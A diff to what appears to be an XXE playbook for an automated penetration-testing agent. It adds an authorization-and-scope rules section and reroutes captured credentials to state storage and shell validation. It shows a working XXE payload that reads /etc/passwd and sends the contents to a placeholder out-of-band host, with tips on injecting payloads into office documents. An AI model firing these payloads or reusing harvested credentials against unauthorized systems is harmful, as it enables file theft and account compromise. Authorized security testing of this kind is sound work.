@@ -4,6 +4,9 @@ description: "XXE to file read, SSRF, and proof. Triggers - application/xml, SOA
 tags: [vuln_assess, exploitation]
 ---
 
+## Rules of Engagement
+Only test systems you are authorized to assess. Confirm the written scope and rate limits before active commands. Prefer the least-invasive check that proves impact; stop on evidence of production impact.
+
 # XXE (XML External Entity)
 
 ## When this fires
@@ -33,7 +36,7 @@ If `/etc/passwd` comes back in the response → classic in-band XXE. No reflecti
 <!ENTITY % f SYSTEM "file:///etc/passwd">
 <!ENTITY % e "<!ENTITY &#x25; x SYSTEM 'http://<OOB>/?d=%f;'>"> %e; %x;
 ```
-**Proof required:** contents of a server file (`/etc/passwd`, app source, a secret) or a provable OOB fetch of a file's bytes. Read creds → add_credential + cred_spray.
+**Proof required:** contents of a server file (`/etc/passwd`, app source, a secret) or a provable OOB fetch of a file's bytes. Read creds → `state_update` (key: credentials); validate via `pentest_shell`.
 
 ## Tooling
 `nuclei -tags xxe`; for DOCX/XLSX: unzip, inject into the XML part, re-zip, upload. Host the OOB DTD on your attacker box (internal targets: transfer the listener inward).
